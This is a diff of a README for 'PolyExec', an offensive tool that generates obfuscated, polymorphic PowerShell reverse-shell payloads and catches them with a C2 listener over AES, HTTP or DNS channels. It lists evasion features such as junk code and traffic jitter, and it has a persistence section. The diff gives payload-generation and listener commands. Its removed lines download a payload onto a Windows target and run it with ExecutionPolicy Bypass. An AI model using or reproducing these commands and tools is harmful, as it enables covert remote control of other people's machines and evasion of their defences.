@@ -1,12 +1,11 @@
 ## PolyExec: Generate polymorphic ps payloads and catch the shells in an aes-256 tunnel. 
-#### This program is only tested on one pair of OSs at the moment.
 
 #### polyexecgen.py - Generate obfuscated PS payloads <br>
 #### c2_catcher.py - Receive the encrypted tunnel
 
 --- 
 
-### C2: <br>
+### C2 Shell Catcher: <br>
 
 TCP - Basic reverse shell (simple)<br>
 Encrypted - AES-256 encrypted TCP (normal)<br>
@@ -25,36 +24,54 @@ junk code<br>
 no two payloads alike<br>
 Traffic jitter<br>
 
-## USAGE:<br>
-    ### Encrypted shell -- full evasion
+---
+
+### PolyExec Gen Usage:
+
+##### Encrypted shell -- full evasion:
+
     ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted -k mygoodpassword
     
-    ### basic TCP sh
+##### basic TCP shell:
+
     ./polyexecgen.py -t 192.168.1.5 -p 6969 -m tcp
     
-    ### HTTP --  web traffic
+##### HTTP --  web traffic:
+
     ./polyexecgen.py -t http://192.168.1.5:6969/shell -m http -k myk3y
     
-    ### DNS C2 (sneaky)
+##### DNS C2 (sneaky):
+
     ./polyexecgen.py -m dns --dns-domain c2.example.com
 
----
+
+### C2 Catcher Usage:
+##### (to listen on privileged ports...< 1024, like 443 or 80), you need to run as sudo)
+
+##### Encrypted listener
+
+    $ python3 c2_catcher.py
+    
+    # Select 1 for encrypted Listener
+    # Enter encryption key: myg00dpassw0rd (same as payload key)
+    
+#### Standard TCP listener
+
+    $ python3 c2_catcher.py
+   
+    # Select [2] for Standard Listener
+    # Enter port: 6969
+    
+#### Config
+
+    $ python3 c2_catcher.py
+    
+    # Select 3, add host/port/encryption setting
 
 <br>
 
-#### start the sh3ll catch3r in encrypted mode:
+---
 
-
-     python3 c2_catcher.py
-
-#### Host the payload:
-
-    python3 -m http.server 6969
-
-#### powershell On Windows target:
-
-    Invoke-WebRequest http://192.168.1.5:6969/payloads/polyexec_encrypted_*.ps1 -OutFile innoc3nt.ps1
-    powershell.exe -ExecutionPolicy Bypass -File innoc3nt.ps1
 
 #### Persistance:
 
